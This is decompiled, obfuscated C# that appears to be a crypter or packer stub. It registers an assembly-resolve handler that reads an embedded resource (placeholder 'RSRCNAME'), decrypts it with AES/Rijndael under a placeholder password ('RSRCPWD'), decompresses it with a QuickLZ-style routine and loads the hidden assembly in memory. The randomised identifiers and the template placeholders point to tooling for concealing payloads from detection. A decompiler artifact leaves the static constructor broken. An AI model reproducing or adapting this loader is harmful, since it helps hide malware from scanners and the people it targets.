using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using AYVtX6Db;
using iLd730DL;
using ns4;
using p80hVGtz;
using yer6kF3B;

namespace ZqaFD1Ap;

internal class unoCa85u
{
	private const int int_0 = 4096;

	private const int DPWC1MT4 = 6;

	private const int W11ooAfF = 4;

	private const int ga5OYYNk = 4;

	private static Assembly A4ihXRRW = null;

	private static readonly byte[] byte_0;

	public static void KKFfbmZ2()
	{
		AppDomain appDomain_ = wBNSfNgl.smethod_4(41280);
		Class16.m8yFGwZR(appDomain_, TLRcwJnJ, 37788);
	}

	internal static Assembly TLRcwJnJ(object object_0, ResolveEventArgs KVDbGFI3)
	{
		if ((object)A4ihXRRW == null)
		{
			Stream stream = Class16.WlJHEhz8(Class16.f0EYAloj(60107), "RSRCNAME", 42186);
			BinaryReader binaryReader_ = new BinaryReader(stream);
			byte[] array = new byte[Class16.smethod_1(stream, 58151)];
			Class16.smethod_2(binaryReader_, array, 0, array.Length, 3990);
			A4ihXRRW = Class16.FFTEa34N(p8R9gh7m(MGTAeZ6M(array, "RSRCPWD")), 48190);
		}
		string[] array2 = fEYzuHW7.l7iyZDKl(A4ihXRRW, 52492);
		string[] array3 = array2;
		int num = 0;
		while (true)
		{
			if (num < array3.Length)
			{
				string string_ = array3[num];
				if (fEYzuHW7.smethod_0(string_, Class16.tThlOe8i(KVDbGFI3, 35212), 2287))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return A4ihXRRW;
	}

	public static byte[] p8R9gh7m(byte[] XNsgAB9W)
	{
		int num = smethod_0(XNsgAB9W);
		int num2 = h6qJXDw4(XNsgAB9W);
		int num3 = 0;
		uint num4 = 1u;
		byte[] array = new byte[num];
		int[] array2 = new int[4096];
		byte[] array3 = new byte[4096];
		int num5 = num - 6 - 4 - 1;
		int num6 = -1;
		uint num7 = 0u;
		int num8 = (XNsgAB9W[0] >> 2) & 3;
		if (num8 != 1 && num8 != 3)
		{
			throw new ArgumentException("C# version only supports level 1 and 3");
		}
		if ((XNsgAB9W[0] & 1) != 1)
		{
			byte[] array4 = new byte[num];
			Class16.Ap5NzaH2(XNsgAB9W, h6qJXDw4(XNsgAB9W), array4, 0, num, 54215);
			return array4;
		}
		while (true)
		{
			if (num4 == 1)
			{
				num4 = (uint)(XNsgAB9W[num2] | (XNsgAB9W[num2 + 1] << 8) | (XNsgAB9W[num2 + 2] << 16) | (XNsgAB9W[num2 + 3] << 24));
				num2 += 4;
				if (num3 <= num5)
				{
					num7 = (uint)((num8 != 1) ? (XNsgAB9W[num2] | (XNsgAB9W[num2 + 1] << 8) | (XNsgAB9W[num2 + 2] << 16) | (XNsgAB9W[num2 + 3] << 24)) : (XNsgAB9W[num2] | (XNsgAB9W[num2 + 1] << 8) | (XNsgAB9W[num2 + 2] << 16)));
				}
			}
			if ((num4 & 1) == 1)
			{
				num4 >>= 1;
				uint num10;
				uint num11;
				if (num8 == 1)
				{
					int num9 = ((int)num7 >> 4) & 0xFFF;
					num10 = (uint)array2[num9];
					if ((num7 & 0xFu) != 0)
					{
						num11 = (num7 & 0xF) + 2;
						num2 += 2;
					}
					else
					{
						num11 = XNsgAB9W[num2 + 2];
						num2 += 3;
					}
				}
				else
				{
					uint num12;
					if ((num7 & 3) == 0)
					{
						num12 = (num7 & 0xFF) >> 2;
						num11 = 3u;
						num2++;
					}
					else if ((num7 & 2) == 0)
					{
						num12 = (num7 & 0xFFFF) >> 2;
						num11 = 3u;
						num2 += 2;
					}
					else if ((num7 & 1) == 0)
					{
						num12 = (num7 & 0xFFFF) >> 6;
						num11 = ((num7 >> 2) & 0xF) + 3;
						num2 += 2;
					}
					else if ((num7 & 0x7F) != 3)
					{
						num12 = (num7 >> 7) & 0x1FFFFu;
						num11 = ((num7 >> 2) & 0x1F) + 2;
						num2 += 3;
					}
					else
					{
						num12 = num7 >> 15;
						num11 = ((num7 >> 7) & 0xFF) + 3;
						num2 += 4;
					}
					num10 = (uint)(num3 - num12);
				}
				array[num3] = array[num10];
				array[num3 + 1] = array[num10 + 1];
				array[num3 + 2] = array[num10 + 2];
				for (int i = 3; i < num11; i++)
				{
					array[num3 + i] = array[num10 + i];
				}
				num3 += (int)num11;
				if (num8 == 1)
				{
					num7 = (uint)(array[num6 + 1] | (array[num6 + 2] << 8) | (array[num6 + 3] << 16));
					while (num6 < num3 - num11)
					{
						num6++;
						int num9 = (int)(((num7 >> 12) ^ num7) & 0xFFF);
						array2[num9] = num6;
						array3[num9] = 1;
						num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (array[num6 + 3] << 16));
					}
					num7 = (uint)(XNsgAB9W[num2] | (XNsgAB9W[num2 + 1] << 8) | (XNsgAB9W[num2 + 2] << 16));
				}
				else
				{
					num7 = (uint)(XNsgAB9W[num2] | (XNsgAB9W[num2 + 1] << 8) | (XNsgAB9W[num2 + 2] << 16) | (XNsgAB9W[num2 + 3] << 24));
				}
				num6 = num3 - 1;
				continue;
			}
			if (num3 > num5)
			{
				break;
			}
			array[num3] = XNsgAB9W[num2];
			num3++;
			num2++;
			num4 >>= 1;
			if (num8 == 1)
			{
				while (num6 < num3 - 3)
				{
					num6++;
					int num13 = array[num6] | (array[num6 + 1] << 8) | (array[num6 + 2] << 16);
					int num9 = ((num13 >> 12) ^ num13) & 0xFFF;
					array2[num9] = num6;
					array3[num9] = 1;
				}
				num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (XNsgAB9W[num2 + 2] << 16));
			}
			else
			{
				num7 = (uint)(((num7 >> 8) & 0xFFFFu) | (XNsgAB9W[num2 + 2] << 16) | (XNsgAB9W[num2 + 3] << 24));
			}
		}
		while (num3 <= num - 1)
		{
			if (num4 == 1)
			{
				num2 += 4;
				num4 = 2147483648u;
			}
			array[num3] = XNsgAB9W[num2];
			num3++;
			num2++;
			num4 >>= 1;
		}
		return array;
	}

	private static int h6qJXDw4(byte[] c6vgJNld)
	{
		if ((c6vgJNld[0] & 2) != 2)
		{
			return 3;
		}
		return 9;
	}

	public static int smethod_0(byte[] KDK0dhY8)
	{
		if (h6qJXDw4(KDK0dhY8) == 9)
		{
			return KDK0dhY8[5] | (KDK0dhY8[6] << 8) | (KDK0dhY8[7] << 16) | (KDK0dhY8[8] << 24);
		}
		return KDK0dhY8[2];
	}

	public static byte[] MGTAeZ6M(byte[] BMW9LRD9, string rfdMPK34)
	{
		Rijndael symmetricAlgorithm_ = fEYzuHW7.pGjAMdJR(10518);
		Rfc2898DeriveBytes deriveBytes_ = new Rfc2898DeriveBytes(rfdMPK34, byte_0);
		fEYzuHW7.QGkjOEqi(symmetricAlgorithm_, fEYzuHW7.MhePAUzX(deriveBytes_, 32, 31522), 10465);
		fEYzuHW7.yNJZv0Pm(symmetricAlgorithm_, fEYzuHW7.MhePAUzX(deriveBytes_, 16, 31522), 25724);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream stream_ = new CryptoStream(memoryStream, fEYzuHW7.BPfAiOjc(symmetricAlgorithm_, 18480), CryptoStreamMode.Write);
		fEYzuHW7.WA4teEur(stream_, BMW9LRD9, 0, BMW9LRD9.Length, 13904);
		vRvDyS3Z.oNl1lUma(stream_, 19282);
		return fEYzuHW7.ykIjjrxK(memoryStream, 49401);
	}

	private static string DCYjSwQV(string string_0, int H0M5gj2T)
	{
		char[] array = Class15.ftpBFsac(string_0, 19054);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (char)(array[i] ^ H0M5gj2T);
		}
		return new string(array);
	}

	static unoCa85u()
	{
		byte[] array_ = new byte[16];
		wBNSfNgl.ew4jYi0G(array_, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/, 48431);
		byte_0 = array_;
	}
}
